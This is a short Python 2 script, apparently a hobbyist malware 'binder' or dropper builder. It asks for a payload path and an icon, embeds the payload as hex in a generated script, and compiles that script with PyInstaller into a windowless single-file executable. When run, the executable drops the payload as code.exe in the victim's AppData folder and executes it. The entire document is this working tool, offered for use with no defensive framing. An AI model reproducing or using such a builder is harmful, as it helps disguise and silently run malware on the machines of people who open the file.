import os,sys
os.system("cls")
os.system("color 06")
print(r"""

   _____   __      ______________ 
  /  _  \ |  | __ /  |  \______  \
 /  /_\  \|  |/ //   |  |_  /    /
/    |    \    </    ^   / /    / 
\____|__  /__|_ \____   | /____/  
        \/     \/    |__|         
                                  
                                  
                           coded by script for fun :)
                           contact me = https://www.facebook.com/Encodedweapon/



	""")
username = os.getenv('username')
file = raw_input("Enter you payload path >>> ")
ico = raw_input("Enter your .ico file path >>> ")
try:
	f = open(file, 'rb')
	data = f.read().encode('hex')
	f.close()
except:
	print(file+" not found 404 motherfucker")
	sys.exit()

x = open('C:\\Users\\'+username+'\\Desktop\\new.py' , 'wb+')
z = "\n\nf = open(\"C:\\\\Users\\\\\"+username+\"\\\\AppData\\\\Local\\\\code.exe\", \"wb+\")\nf.write(x.decode('hex'))\nf.close()\nos.system(\"C:\\\\Users\\\\\"+username+\"\\\\AppData\\\\Local\\\\code.exe\")"
x.write("import os\nusername = os.getenv('username')\n")
x.write("x = "+"\""+data+"\"")
x.write(z)
x.close()
if ico == "":
	os.system("C:\\Python27\\Scripts\\pyinstaller C:\\Users\\"+username+"\\Desktop\\new.py -w -F")
else:
	os.system("C:\\Python27\\Scripts\\pyinstaller C:\\Users\\"+username+"\\Desktop\\new.py -w -F -i "+ico)
os.system("cls")
os.system("color 04")
print("file saved here dist\\new.exe")
